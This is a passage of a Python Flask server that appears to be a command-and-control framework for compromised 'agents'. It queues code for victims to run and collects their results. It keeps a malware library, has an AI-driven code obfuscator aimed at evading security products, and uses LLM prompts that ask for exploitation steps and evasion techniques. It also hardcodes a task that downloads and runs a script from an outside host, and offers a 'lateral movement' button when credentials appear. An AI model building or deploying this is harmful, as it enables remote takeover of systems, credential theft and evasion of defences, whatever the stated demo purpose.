        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/studio/library/<script_id>', methods=['DELETE'])
def studio_delete_script(script_id):
    """Delete a script from the library"""
    try:
        scripts = malware_library.get("scripts", [])
        original_count = len(scripts)
        
        malware_library["scripts"] = [s for s in scripts if s["id"] != script_id]
        
        if len(malware_library["scripts"]) < original_count:
            if save_malware_library():
                logger.info(f"Script deleted from library: {script_id}")
                return jsonify({
                    "status": "success",
                    "message": "Script deleted"
                })
            else:
                return jsonify({"status": "error", "message": "Failed to save library"}), 500
        else:
            return jsonify({"status": "error", "message": "Script not found"}), 404
        
    except Exception as e:
        logger.error(f"Error deleting script: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/studio/library/<script_id>', methods=['PUT'])
def studio_update_script(script_id):
    """Update a script in the library"""
    try:
        data = request.json
        
        for script in malware_library.get("scripts", []):
            if script["id"] == script_id:
                # Update fields
                if 'name' in data:
                    script['name'] = data['name']
                if 'description' in data:
                    script['description'] = data['description']
                if 'code' in data:
                    script['code'] = data['code']
                if 'category' in data:
                    script['category'] = data['category']
                if 'tags' in data:
                    script['tags'] = data['tags']
                
                script['updated_at'] = datetime.now().isoformat()
                
                if save_malware_library():
                    logger.info(f"Script updated in library: {script_id}")
                    return jsonify({
                        "status": "success",
                        "message": "Script updated",
                        "script": script
                    })
                else:
                    return jsonify({"status": "error", "message": "Failed to save library"}), 500
        
        return jsonify({"status": "error", "message": "Script not found"}), 404
        
    except Exception as e:
        logger.error(f"Error updating script: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/studio/deploy', methods=['POST'])
def studio_deploy_script():
    """Deploy a script from the studio to an agent"""
    try:
        data = request.json
        agent_id = data.get('agent_id')
        code = data.get('code')
        language = data.get('language', 'python')
        
        if not agent_id or not code:
            return jsonify({"status": "error", "message": "Missing agent_id or code"}), 400
        
        # Add language tag if not present
        if not code.strip().startswith('#'):
            if language == 'python':
                code = '#python\n' + code
            elif language == 'powershell':
                code = '#ps\n' + code
            elif language == 'bash':
                code = '#bash\n' + code
        
        # Create task
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": "custom",
            "code": code,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "ai_generated": False,
            "studio_deployed": True
        }
        
        logger.info(f"Studio script deployed to agent {agent_id}: {task_id}")
        
        return jsonify({
            "status": "success",
            "task_id": task_id,
            "message": "Script deployed successfully"
        })
        
    except Exception as e:
        logger.error(f"Error deploying script: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500


# Routes
@app.route('/')
def index():
    """Main dashboard"""
    return render_template('index.html', 
                          agents=agents, 
                          tasks=tasks,
                          results=results)

@app.route('/dashboard')
def dashboard():
    """Redirect to main page"""
    return redirect(url_for('index'))

@app.route('/logout')
def logout():
    """Logout and clear session"""
    session.clear()
    return redirect(url_for('index'))

# TARGET SELECTION ENDPOINTS (HYBRID)
@app.route('/select_target', methods=['POST'])
def select_target():
    """Select a specific target company for this session"""
    try:
        data = request.json
        sector = data.get("sector")
        company_name = data.get("company_name")
        
        if not sector or not company_name:
            return jsonify({"status": "error", "message": "Missing sector or company_name"}), 400
        
        session_id = session.get('demo_id')
        if not session_id:
            session_id = str(uuid.uuid4())
            session['demo_id'] = session_id
        
        victim_companies = victims_config.get("victim_companies", {})
        company = None
        for comp in victim_companies.get(sector, []):
            if comp['name'] == company_name:
                company = comp
                break
        
        if not company:
            return jsonify({"status": "error", "message": "Company not found"}), 404
        
        revenue_num = float(company["revenue"].replace("$", "").replace("B", "000000000").replace("M", "000000"))
        estimated_value = int(revenue_num * random.uniform(0.001, 0.005))
        
        DEMO_COMPANIES[session_id] = {
            "sector": sector,
            "company_name": company['name'],
            "employees": company['employees'],
            "revenue": company['revenue'],
            "description": company['description'],
            "estimated_value": estimated_value,
            "breach_date": datetime.now().isoformat(),
            "risk_level": random.choice(["High", "Critical", "Medium"]),
            "data_types": get_sector_data_types(sector),
            "selected_at": datetime.now().isoformat()
        }
        
        logger.info(f"Target selected by session {session_id}: {company['name']} ({sector})")
        
        return jsonify({
            "status": "success",
            "target": DEMO_COMPANIES[session_id]
        })
        
    except Exception as e:
        logger.error(f"Error in select_target: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get_current_target', methods=['GET'])
def get_current_target():
    """Get the currently selected target for this session"""
    try:
        session_id = session.get('demo_id')
        
        if session_id and session_id in DEMO_COMPANIES:
            return jsonify({
                "status": "success",
                "target": DEMO_COMPANIES[session_id],
                "source": "session"
            })
        
        global DEMO_COMPANY
        if DEMO_COMPANY is not None:
            return jsonify({
                "status": "success",
                "target": DEMO_COMPANY,
                "source": "global"
            })
        
        return jsonify({"status": "no_target"}), 404
        
    except Exception as e:
        logger.error(f"Error in get_current_target: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/reset_demo', methods=['POST'])
def reset_demo():
    """Reset demo - clear all targets and session data"""
    try:
        global DEMO_COMPANY
        DEMO_COMPANY = None
        
        session_id = session.get('demo_id')
        if session_id and session_id in DEMO_COMPANIES:
            del DEMO_COMPANIES[session_id]
        
        session.clear()
        
        logger.info("Demo reset - all targets cleared")
        
        return jsonify({
            "status": "success",
            "message": "Demo reset successfully"
        })
        
    except Exception as e:
        logger.error(f"Error in reset_demo: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/set_global_target', methods=['POST'])
def set_global_target():
    """Set a global target for all users (for live demos)"""
    try:
        data = request.json
        sector = data.get("sector")
        company_name = data.get("company_name")
        
        if not sector or not company_name:
            return jsonify({"status": "error", "message": "Missing sector or company_name"}), 400
        
        victim_companies = victims_config.get("victim_companies", {})
        company = None
        for comp in victim_companies.get(sector, []):
            if comp['name'] == company_name:
                company = comp
                break
        
        if not company:
            return jsonify({"status": "error", "message": "Company not found"}), 404
        
        revenue_num = float(company["revenue"].replace("$", "").replace("B", "000000000").replace("M", "000000"))
        estimated_value = int(revenue_num * random.uniform(0.001, 0.005))
        
        global DEMO_COMPANY
        DEMO_COMPANY = {
            "sector": sector,
            "company_name": company['name'],
            "employees": company['employees'],
            "revenue": company['revenue'],
            "description": company['description'],
            "estimated_value": estimated_value,
            "breach_date": datetime.now().isoformat(),
            "risk_level": random.choice(["High", "Critical", "Medium"]),
            "data_types": get_sector_data_types(sector)
        }
        
        logger.info(f"GLOBAL target set: {company['name']} ({sector})")
        
        return jsonify({
            "status": "success",
            "target": DEMO_COMPANY,
            "message": "Global target set for all users"
        })
        
    except Exception as e:
        logger.error(f"Error in set_global_target: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

# AI TOGGLE ENDPOINTS
@app.route('/get_ai_status', methods=['GET'])
def get_ai_status():
    """Get current AI mode status"""
    return jsonify({
        "status": "success",
        "ai_enabled": USE_AI,
        "ai_scope": "attack_tasks_only",
        "chat_ai": "always_enabled",
        "obfuscator_ai": "always_enabled",
        "analysis_ai": "always_enabled",
        "crowdstrike_configured": bool(CROWDSTRIKE_WORKFLOW_ID and crowdstrike_config),
        "fallback_payloads_loaded": len(fallback_payloads)
    })

@app.route('/toggle_ai', methods=['POST'])
def toggle_ai():
    """Toggle AI mode on/off (only affects attack task generation)"""
    global USE_AI
    
    try:
        data = request.json
        new_state = data.get("enabled")
        
        if new_state is None:
            USE_AI = not USE_AI
        else:
            USE_AI = bool(new_state)
        
        logger.info(f"AI mode for attack tasks {'ENABLED' if USE_AI else 'DISABLED'}")
        
        return jsonify({
            "status": "success",
            "ai_enabled": USE_AI,
            "message": f"AI mode for attack tasks {'enabled' if USE_AI else 'disabled'}",
            "note": "Chat, Obfuscator, and Analysis always use AI"
        })
        
    except Exception as e:
        logger.error(f"Error toggling AI: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

# AGENT COMMUNICATION ENDPOINTS
@app.route('/scripts/<script_name>', methods=['GET'])
def get_script(script_name):
    """Endpoint for agents to download analysis scripts"""
    scripts_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scripts")
    
    if '..' in script_name or '/' in script_name or '\\' in script_name:
        return jsonify({"status": "error", "message": "Invalid script name"}), 400
        
    script_path = os.path.join(scripts_dir, script_name)
    if not os.path.exists(script_path):
        return jsonify({"status": "error", "message": "Script not found"}), 404
        
    with open(script_path, 'r') as f:
        script_content = f.read()
        
    return jsonify({
        "status": "success",
        "script": script_content
    })

@app.route('/tasks', methods=['GET'])
def get_tasks():
    """Endpoint for agents to check for tasks"""
    agent_id = request.args.get('agent')
    
    if not agent_id:
        return jsonify({"status": "error", "message": "Missing agent ID"}), 400
    
    try:
        if agent_id not in agents:
            victim_info = assign_victim_company(agent_id)
            agents[agent_id] = {
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "victim_company": victim_info
            }
            logger.info(f"New victim compromised: {victim_info['company_name']} ({victim_info['sector']})")
        else:
            agents[agent_id]["last_seen"] = datetime.now().isoformat()
            
            if "victim_company" not in agents[agent_id]:
                logger.info(f"Updating existing agent {agent_id} with victim company info")
                victim_info = assign_victim_company(agent_id)
                agents[agent_id]["victim_company"] = victim_info
        
        pending_tasks = [t for t in tasks.values() 
                        if t.get("agent_id") == agent_id and 
                        t.get("status") == "pending"]
        
        if pending_tasks:
            task = pending_tasks[0]
            task["status"] = "sent"
            return jsonify({
                "status": "task_available",
                "task": task
            })
        
        if random.random() < 0.05:
            clean_old_data()
            
        return jsonify({"status": "no_tasks"})
        
    except Exception as e:
        logger.error(f"Error in get_tasks: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/results', methods=['POST'])
def post_results():
    """Endpoint for agents to submit task results"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        task_id = data.get("task_id")
        result = data.get("result")
        
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        if not task_id:
            return jsonify({"status": "error", "message": "Missing task_id"}), 400
        if result is None:
            return jsonify({"status": "error", "message": "Missing result"}), 400
        
        if task_id == "heartbeat":
            if agent_id in agents:
                agents[agent_id]["last_seen"] = datetime.now().isoformat()
                if "system_info" in result:
                    agents[agent_id]["system_info"] = result["system_info"]
            logger.info(f"Heartbeat received from agent {agent_id}")
            return jsonify({"status": "heartbeat_received"})
            
        result_size = len(json.dumps(result))
        if result_size > MAX_RESULT_SIZE:
            logger.warning(f"Result too large: {result_size} bytes")
            return jsonify({"status": "error", "message": "Result too large"}), 400
        
        result_id = str(uuid.uuid4())
        results[result_id] = {
            "agent_id": agent_id,
            "task_id": task_id,
            "data": result,
            "timestamp": datetime.now().isoformat()
        }
        
        if task_id in tasks:
            tasks[task_id]["status"] = "completed"
        
        if len(results) > MAX_HISTORY_ITEMS * 0.9:
            clean_old_data()
            
        logger.info(f"Result received from {agent_id} for task {task_id}")
        return jsonify({"status": "result_received"})
    
    except Exception as e:
        logger.error(f"Error in post_results: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/create_task', methods=['POST'])
def create_task():
    """Admin endpoint to create new tasks"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        task_type = data.get("task_type")
        custom_code = data.get("custom_code")

        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        if not task_type:
            return jsonify({"status": "error", "message": "Missing task_type"}), 400

        logger.info(f"Creating task: {task_type} for agent {agent_id} (AI for attacks: {'ON' if USE_AI else 'OFF'})")

        # Manejo especial para código ofuscado
        if task_type == "obfuscated":
            if not custom_code:
                return jsonify({"status": "error", "message": "Missing custom_code for obfuscated task"}), 400
            
            # No validar tags para código ofuscado - se ejecuta tal cual
            code = custom_code
            logger.info(f"Obfuscated task created - no tag validation applied")
            
        elif task_type == "custom" and custom_code:
            # Validación normal de tags para custom code
            lines = [line.strip() for line in custom_code.strip().splitlines() if line.strip()]
            first_line = lines[0].lower() if lines else ""

            allowed_tags = ["#python", "#bash", "#ps"]
            if not any(first_line.startswith(tag) for tag in allowed_tags):
                return jsonify({
                    "status": "error",
                    "message": "Custom scripts must start with one of the following tags: #python, #bash or #ps"
                }), 400

            code = custom_code
            
        else:
            # Código generado por AI para tareas predefinidas
            agent_environment = {}
            for result in results.values():
                if result.get("agent_id") == agent_id and result.get("task_id") == "init":
                    agent_environment = result.get("data", {})

            code = generate_code(task_type, agent_environment)

        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": task_type,
            "code": code,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "ai_generated": USE_AI and task_type not in ["custom", "obfuscated"]
        }

        logger.info(f"Task created successfully: {task_id} for agent {agent_id} (type: {task_type})")

        return jsonify({
            "status": "task_created",
            "task_id": task_id
        })

    except Exception as e:
        logger.error(f"Error in create_task: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/create_security_analysis', methods=['POST'])
def create_security_analysis():
    """Create a security analysis task for an agent"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
            
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": "security_analysis",
            "code": "",
            "status": "pending",
            "created_at": datetime.now().isoformat()
        }
        
        return jsonify({
            "status": "task_created",
            "task_id": task_id
        })
        
    except Exception as e:
        logger.error(f"Error creating security analysis task: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/chat', methods=['POST'])
def chat_message():
    """Process a chat message, create a task, and return execution results - ALWAYS uses AI"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        message = data.get("message")
        conversation_id = data.get("conversation_id")
        execution_type = data.get("execution_type", "python")  # Default: python

        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        if not message:
            return jsonify({"status": "error", "message": "Missing message"}), 400

        # ✅ Validación: Solo Python o PowerShell
        if execution_type not in ["python", "powershell"]:
            return jsonify({
                "status": "error",
                "message": f"Invalid execution type '{execution_type}'. Only 'python' or 'powershell' allowed."
            }), 400

        logger.info(f"Chat request for agent {agent_id} ({execution_type}): {message}")

        # Preparar prompt según tipo
        conversation_history = agent_conversations.get(conversation_id, [])

        if execution_type == "powershell":
            enhanced_message = (
                f"Generate a PowerShell one-liner command for: {message}\n\n"
                "CRITICAL INSTRUCTIONS:\n"
                "- Return ONLY the PowerShell command as a single line\n"
                "- NO explanations, NO markdown, NO code blocks\n"
                "- NO comments, NO extra text\n"
                "- Just the raw executable PowerShell command\n"
                "- Use semicolons (;) to chain multiple commands if needed"
            )
        else:  # python
            enhanced_message = (
                f"Generate Python code for: {message}\n\n"
                "CRITICAL INSTRUCTIONS:\n"
                "- Return complete, executable Python code\n"
                "- Include proper structure with def main() and if __name__ == '__main__'\n"
                "- Use proper imports\n"
                "- Return the code in a ```python code block"
            )

        # Llamar a handle_conversation
        result = handle_conversation(agent_id, enhanced_message, conversation_history, execution_type)
        ai_response = result["response"]
        code = result["code"]

        # ✅ Validación final - SIN RESTRICCIONES DE TAGS
        if execution_type == "python":
            # Asegurar que el código Python tiene estructura
            if "def main(" not in code and "__name__" not in code:
                logger.warning("Python code missing structure, wrapping...")
                code = f"""def main():
    # Generated code
{chr(10).join('    ' + line for line in code.split(chr(10)))}

if __name__ == "__main__":
    main()"""
        
        elif execution_type == "powershell":
            # Limpiar cualquier residuo de markdown o explicaciones
            code = code.strip()
            if code.startswith("```"):
                # Extraer de code block si existe
                import re
                match = re.search(r"```(?:powershell)?\s*(.*?)```", code, re.DOTALL)
                if match:
                    code = match.group(1).strip()
            
            # Remover líneas de comentarios
            lines = [line.strip() for line in code.split('\n') if line.strip() and not line.strip().startswith('#')]
            code = '; '.join(lines) if len(lines) > 1 else (lines[0] if lines else code)
            
            logger.info(f"Final PowerShell one-liner: {code[:150]}...")

        # Guardar conversación
        if not conversation_id:
            conversation_id = f"conv-{uuid.uuid4()}"
        agent_conversations[conversation_id] = result["conversation"]

        # Crear tarea
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": "conversation",
            "code": code,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "conversation_id": conversation_id,
            "original_message": message,
            "execution_type": execution_type,
            "ai_generated": True
        }

        logger.info(f"Task created: {task_id} ({execution_type}) - Code length: {len(code)} chars")

        # Esperar resultados (30 segundos)
        timeout_seconds = 30
        start_time = datetime.now()
        execution_result = None

        while (datetime.now() - start_time).total_seconds() < timeout_seconds:
            for result_id, result_data in results.items():
                if result_data.get("task_id") == task_id:
                    execution_result = result_data
                    break
            if execution_result:
                break
            time.sleep(0.5)

        # ✅ NUEVO: Procesar resultados con formato limpio de chat
        if execution_result:
            result_data = execution_result.get("data", {})
            output = result_data.get("output", "")
            stdout = result_data.get("stdout", "")
            stderr = result_data.get("stderr", "")
            error = result_data.get("error", "")

            # ✅ Formato limpio como chat assistant
            if error:
                # Si hay error, mostrarlo de forma natural
                execution_message = f"I encountered an error while executing that:\n\n{error}"
            elif stderr and stderr.strip():
                # Si hay stderr pero no error fatal, mostrar output + warning
                if output or stdout:
                    execution_message = (output or stdout).strip()
                    execution_message += f"\n\n⚠️ Note: {stderr.strip()}"
                else:
                    execution_message = f"⚠️ {stderr.strip()}"
            else:
                # Ejecución exitosa - solo el output limpio
                execution_message = (output or stdout or "Command executed successfully with no output.").strip()

            agent_conversations[conversation_id].append({
                "role": "assistant",
                "content": execution_message
            })

            tasks[task_id]["status"] = "completed"
            final_response = execution_message

        else:
            timeout_message = "I've generated the code, but I'm still waiting for the execution results. The agent might be busy or offline."
            agent_conversations[conversation_id].append({
                "role": "assistant",
                "content": timeout_message
            })
            final_response = timeout_message

        return jsonify({
            "status": "message_processed",
            "conversation_id": conversation_id,
            "task_id": task_id,
            "ai_response": final_response,
            "execution_completed": execution_result is not None,
            "execution_type": execution_type,
            "code_preview": code[:200] + "..." if len(code) > 200 else code,
            "ai_enabled": True
        })

    except Exception as e:
        logger.error(f"Error in chat_message: {traceback.format_exc()}")
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@app.route('/get_task/<task_id>', methods=['GET'])
def get_task(task_id):
    try:
        logger.info(f"=== GET_TASK START ===")
        logger.info(f"Task ID: {task_id}")
        
        if task_id in tasks:
            logger.info(f"Task {task_id} found in tasks dictionary")
            task_data = tasks[task_id]
            code = task_data.get("code", "No code available")
            logger.info(f"Code retrieved successfully for task {task_id}")
            logger.info(f"Code length: {len(code)} chars")
            
            return jsonify({
                "status": "success",
                "task": {
                    "id": task_data.get("id"),
                    "agent_id": task_data.get("agent_id"),
                    "task_type": task_data.get("task_type"),
                    "code": code,
                    "status": task_data.get("status"),
                    "created_at": task_data.get("created_at"),
                    "marketplace_tool": task_data.get("marketplace_tool"),
                    "victim_company": task_data.get("victim_company"),
                    "ai_generated": task_data.get("ai_generated", False),
                    "execution_type": task_data.get("execution_type", "python")
                }
            })
        else:
            logger.warning(f"Task {task_id} not found in tasks dictionary")
            return jsonify({"status": "error", "message": "Task not found"}), 404
    except Exception as e:
        logger.error(f"Error in get_task: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/obfuscate_code', methods=['POST'])
def obfuscate_code_endpoint():
    """Endpoint to obfuscate code using CrowdStrike workflow - ALWAYS uses AI"""
    try:
        data = request.json
        code = data.get("code")
        language = data.get("language", "python")
        target_security = data.get("target_security", "generic")
        
        if not code:
            return jsonify({"status": "error", "message": "No code provided"}), 400
        
        result = obfuscate_code(code, language, target_security)
        
        return jsonify({
            "status": "success",
            "original_code": code,
            "obfuscated_code": result["obfuscated_code"],
            "explanation": result["explanation"],
            "ai_enabled": True
        })
        
    except Exception as e:
        logger.error(f"Error in obfuscate_code: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/analyze_attack_paths', methods=['POST'])
def analyze_attack_paths():
    """Analyze potential attack paths based on reconnaissance data - ALWAYS uses AI"""
    try:
        data = request.json
        agent_id = data.get("agent_id")
        analysis_type = data.get("analysis_type", "basic")
        
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        
        if analysis_type == "advanced":
            task_id = str(uuid.uuid4())

            agent_platform = agents.get(agent_id, {}).get("platform", "").lower()

            if "windows" in agent_platform:
                script = (
                    "Invoke-WebRequest -Uri http://iotstdpool.com:8000/scripts/winpeas.bat -OutFile winpeas.bat; cmd.exe /c winpeas.bat"
                )
            else:
                script = (
                    "Invoke-WebRequest -Uri http://iotstdpool.com:8000/scripts/winpeas.bat -OutFile winpeas.bat; cmd.exe /c winpeas.bat"
                )

            tasks[task_id] = {
                "id": task_id,
                "agent_id": agent_id,
                "task_type": "security_analysis",
                "code": script,
                "status": "pending",
                "created_at": datetime.now().isoformat(),
                "command": "download and execute winpeas/linpeas"
            }

            logger.info(f"Created advanced security analysis task {task_id} for agent {agent_id}")

            return jsonify({
                "status": "analysis_initiated",
                "message": "Advanced security analysis task created. This can take several minutes. Check results shortly.",
                "task_id": task_id,
                "analysis_type": "advanced"
            })

        else:
            recon_data = {}
            for result in results.values():
                if result.get("agent_id") == agent_id:
                    recon_data.update(result.get("data", {}))
            
            if not CROWDSTRIKE_WORKFLOW_ID or not crowdstrike_config:
                analysis = "CrowdStrike workflow not configured. This would normally provide AI analysis of attack paths."
            else:
                system_prompt = f"""You are a security research assistant analyzing a system for potential attack paths. 
Based on the reconnaissance data, identify vulnerabilities and suggest specific techniques that could 
be used in a controlled research environment to test security product detection capabilities. 
For each suggestion, provide:
1. The attack technique name and MITRE ATT&CK tactic
2. Why this would be effective in this environment
3. How it might evade the detected security products
4. A high-level implementation approach

Analyze this system reconnaissance data and suggest attack paths: {json.dumps(recon_data)}"""
                
                try:
                    cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
                    analysis = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, system_prompt)
                except Exception as e:
                    logger.error(f"CrowdStrike analysis error: {str(e)}")
                    analysis = f"Error during CrowdStrike analysis: {str(e)}"
            
            result_id = str(uuid.uuid4())
            results[result_id] = {
                "agent_id": agent_id,
                "task_id": "attack_path_analysis",
                "data": {
                    "analysis": analysis,
                    "timestamp": datetime.now().isoformat(),
                    "analysis_type": "basic",
                    "ai_enabled": True
                }
            }
            
            return jsonify({
                "status": "analysis_complete",
                "result_id": result_id,
                "analysis": analysis,
                "analysis_type": "basic",
                "ai_enabled": True
            })
            
    except Exception as e:
        logger.error(f"Error in analyze_attack_paths: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/check_analysis_status/<task_id>', methods=['GET'])
def check_analysis_status(task_id):
    """Check status of advanced security analysis - ALWAYS uses AI"""
    try:
        if task_id in tasks:
            task_status = tasks[task_id].get("status")
            
            if task_status == "completed":
                result_found = None
                result_id = None
                
                for r_id, result_data in results.items():
                    if result_data.get("task_id") == task_id:
                        result_found = result_data
                        result_id = r_id
                        break
                
                if result_found:
                    if "ai_analysis" not in result_found.get("data", {}):
                        scan_data = result_found.get("data", {})
                        
                        if CROWDSTRIKE_WORKFLOW_ID and crowdstrike_config:
                            try:
                                analysis_input = {
                                    "summary": scan_data.get("summary", []),
                                    "categories": scan_data.get("categories", {}),
                                    "system_info": scan_data.get("system_info", {})
                                }
                                
                                system_prompt = f"""You are an expert penetration tester analyzing the output of 
                                LinPEAS/WinPEAS security scans. Based on the detailed findings, identify:
                                
                                1. The most critical security vulnerabilities and misconfigurations
                                2. Specific, actionable attack paths that could be exploited
                                3. For each attack path, provide:
                                   - The MITRE ATT&CK techniques involved
                                   - Step-by-step exploitation approach
                                   - Required tools and commands
                                   - Estimated likelihood of success
                                
                                Format your response with clear headings and prioritize findings by severity.
                                This is for authorized security testing only.
                                
                                Analyze these security scan results and provide detailed attack path recommendations: {json.dumps(analysis_input)}"""
                                
                                cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
                                ai_analysis = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, system_prompt)
                                
                                result_found["data"]["ai_analysis"] = ai_analysis
                                results[result_id] = result_found
                                
                            except Exception as e:
                                logger.error(f"Error generating CrowdStrike analysis: {traceback.format_exc()}")
                                result_found["data"]["ai_analysis"] = f"Error generating CrowdStrike analysis: {str(e)}"
                                results[result_id] = result_found
                        else:
                            result_found["data"]["ai_analysis"] = "CrowdStrike workflow not configured. Cannot generate AI analysis of security scan results."
                            results[result_id] = result_found
                    
                    return jsonify({
                        "status": "completed",
                        "result_id": result_id,
                        "summary": result_found.get("data", {}).get("summary", []),
                        "ai_analysis": result_found.get("data", {}).get("ai_analysis", "No interpretation available."),
                        "ai_enabled": True
                    })

                return jsonify({
                    "status": "pending",
                    "message": "Task completed but results not found yet"
                })
            else:
                return jsonify({
                    "status": "pending", 
                    "message": f"Analysis in progress, status: {task_status}"
                })
        else:
            return jsonify({
                "status": "error",
                "message": "Analysis task not found"
            }), 404
            
    except Exception as e:
        logger.error(f"Error checking analysis status: {traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/analyze_results_with_ai', methods=['POST'])
def analyze_results_with_ai():
    """Analyze results with AI - ALWAYS uses AI"""
    data = request.get_json(silent=True) or {}
    raw_output = data.get('raw_output', '')

    banner = {"show": False}

    if not raw_output:
        return jsonify({
            "status": "error",
            "message": "Missing raw_output",
            "banner": banner
        }), 400

    analysis_prompt_template = prompts_config.get("analysis_prompt", 
        "Analyze this output: {raw_output}")
    
    prompt = analysis_prompt_template.format(raw_output=raw_output)

    try:
        if not CROWDSTRIKE_WORKFLOW_ID or not crowdstrike_config:
            ai_response = "CrowdStrike workflow not configured. Cannot analyze results."
        else:
            cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
            ai_response = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, prompt)
            
    except Exception as e:
        logger.error(f"CrowdStrike analysis error: {e}")
        return jsonify({
            "status": "error",
            "message": str(e),
            "banner": banner
        }), 500

    try:
        text_to_scan = (raw_output or "").lower()
        detected = ("samba" in text_to_scan and "password" in text_to_scan)
    except Exception:
        detected = False

    if detected:
        banner = {
            "show": True,
            "title": "Credentials Detected",
            "message": "Potential credentials have been identified in the analysis output. The system has detected authentication information that could be used for lateral movement operations.",
            "cta": {
                "yes": {"label": "Initiate Lateral Movement", "action": "lateral_movement"},
                "no": {"label": "Continue Analysis", "action": "dismiss"}
            }
        }

    return jsonify({
        "status": "success",
        "analysis": ai_response,
        "banner": banner,
        "ai_enabled": True
    })

# Test prompts endpoints
@app.route('/get_test_prompts', methods=['GET'])
def get_test_prompts():
    """Get testing prompts (separate from production prompts)"""
    try:
        test_prompts_file = "test_prompts.json"
        
        if not os.path.exists(test_prompts_file):
            default_test_prompts = {
                "test_prompts": {
                    "example_recon": "Generate Python code to gather basic system information including hostname, OS version, and running processes.",
                    "example_persistence": "Create a Python script that demonstrates file system enumeration techniques.",
                    "custom_test_1": "",
                    "custom_test_2": "",
                    "custom_test_3": ""
                }
            }
            with open(test_prompts_file, 'w') as f:
                json.dump(default_test_prompts, f, indent=2)
        
        with open(test_prompts_file, 'r') as f:
            test_prompts = json.load(f)
        
        return jsonify({
            "status": "success",
            "prompts": test_prompts
        })
        
    except Exception as e:
        logger.error(f"Error getting test prompts: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/update_test_prompts', methods=['POST'])
def update_test_prompts():
    """Update testing prompts (separate from production)"""
    try:
        data = request.json
        new_prompts = data.get("prompts")
        
        if not new_prompts:
            return jsonify({"status": "error", "message": "Missing prompts data"}), 400
        
        test_prompts_file = "test_prompts.json"
        
        with open(test_prompts_file, 'w') as f:
            json.dump(new_prompts, f, indent=2)
        
        logger.info("Test prompts updated successfully")
        
        return jsonify({
            "status": "success",
            "message": "Test prompts updated successfully"
        })
        
    except Exception as e:
        logger.error(f"Error updating test prompts: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/execute_test_prompt', methods=['POST'])
def execute_test_prompt():
    """Execute a test prompt and return the generated code - ALWAYS uses AI"""
    try:
        data = request.json
        prompt = data.get("prompt")
        agent_id = data.get("agent_id")
        
        if not prompt:
            return jsonify({"status": "error", "message": "Missing prompt"}), 400
        if not agent_id:
            return jsonify({"status": "error", "message": "Missing agent_id"}), 400
        
        if not CROWDSTRIKE_WORKFLOW_ID or not crowdstrike_config:
            code = f'''def main():
    """
    Generated from test prompt: {prompt[:50]}...
    """
    import os
    import platform
    
    print("Test prompt execution:")
    print(f"Hostname: {{os.getenv('COMPUTERNAME', 'unknown')}}")
    print(f"Platform: {{platform.platform()}}")
    
    return "Test prompt executed successfully"

if __name__ == "__main__":
    main()'''
        else:
            try:
                cs_client = CrowdStrikeAIClient(CROWDSTRIKE_CONFIG_PATH)
                raw_response = cs_client.run_workflow(CROWDSTRIKE_WORKFLOW_ID, prompt)
                
                code = sanitize_llm_code(raw_response, "ai_testing")
                
            except Exception as e:
                logger.error(f"CrowdStrike workflow failed for test prompt: {str(e)}")
                code = f'''def main():
    return "Error executing test prompt: {str(e)}"'''
        
        task_id = str(uuid.uuid4())
        tasks[task_id] = {
            "id": task_id,
            "agent_id": agent_id,
            "task_type": "ai_testing",
            "code": code,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "test_prompt": prompt,
            "ai_generated": True
        }
        
        logger.info(f"AI testing task created: {task_id} for agent {agent_id} (AI: ALWAYS ON)")
        
        return jsonify({
